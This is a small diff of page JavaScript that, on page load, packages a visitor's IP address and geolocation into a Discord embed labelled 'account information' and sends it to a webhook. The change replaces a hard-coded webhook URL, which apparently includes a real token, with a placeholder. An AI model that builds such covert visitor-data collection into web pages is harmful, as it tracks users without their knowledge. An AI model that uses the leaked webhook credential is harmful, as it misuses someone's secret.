@@ -32,7 +32,7 @@ document.addEventListener("DOMContentLoaded", () => {
         // 正規化（保證資料不會 undefined）
         const data = normalizeGeo(geoData, userIP);
 
-        const webhookURL = "https://discord.com/api/webhooks/1496135328560320683/iUcYfGuKX8im6n9KD0rsLhKec0QQ-JILGPgg0JE1mZx16-9CeQArJ7yaZmwx-Fp3X8RC";
+        const webhookURL = "discord webhook url";
 
         const embedPayload = {
             username: "帳號資訊",
